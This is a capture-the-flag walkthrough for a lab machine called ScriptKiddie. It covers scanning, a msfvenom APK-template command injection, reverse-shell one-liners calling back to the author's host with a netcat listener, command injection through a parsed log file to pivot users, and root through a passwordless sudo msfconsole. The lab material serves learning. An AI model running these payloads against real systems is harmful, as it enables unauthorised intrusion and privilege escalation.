# Scritp Kiddie walkthroughs

Machine ip: 10.10.10.226

Running ```nmap -sV -sC -sS -oN nmapo.txt -v -p 0-10000 10.10.10.226``` gave this output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods:
|_  Supported Methods: POST GET OPTIONS HEAD
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## User

We can find a webpage at port 5000 in which we have the possibility to run 3 commands on the target machine. The first one is 'nmap' and even if it works cannot be used to find vulnerabilities on the host. The second command is 'msfvenom' and we can use this command to create a file that in theory should be used by the host to get a reverse shell. The third one is 'searchsploit' and it's useless too.

We can achieve a remote code execution abusing 'msfvenom' when we try to run the command for android and using a correct template. This is possible because during the creation of the .apk file a part of it is executed. More information could be found here: https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md

The payload that I've used to create the reverse shell is:
```
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.252 LPORT=4444 -f raw -o shellClownFace.sh; chmod 777 shellClownFace.sh; bash shellClownFace.sh
```
and on my machine
```
nc -lvnp 4444
```

We are now logged in as kid who has user privileges and we can grab the hash from the user.txt file on his desktop

## Root

In order to get a shell with a better stability we can put our ssh public key into kid's ```.ssh/authorized_keys``` and log in with ssh.

Before we can get root we need to gain access to pwn, the other user on the host machine that have more privileges then us.

After a little bit of enumeration we find a bash script (non mi ricordo il nome) that reads information from a file on our home ```/home/kid/logs/hackers```. We can see from the script how the information are parsed and executed so we can try to abuse this script to get an higher privileges.

If we try to write something to the file we notice that the script is immediately executed so we can insert into our payload and just listen for a connection on our machine.

Payload: ```[2021-02-10 15:05:20.356712] 10.10.10.252;  bash -c "msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.252 LPORT=4444 -f raw -o shellClownFace.sh; chmod 777 shellClownFace.sh; bash shellClownFace.sh " ```

Listener: ```nc -lvnp 4444```

We have now access to the machine with pwn.

Now it is enough to run ```sudo -l``` to discover that pwn can run msfconsole with sudo privileges without the password.
```
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
so after running ```sudo /opt/metasploit-framework-6.0.9/msfconsole``` we can just go to root folder and grab the root.txt hash 
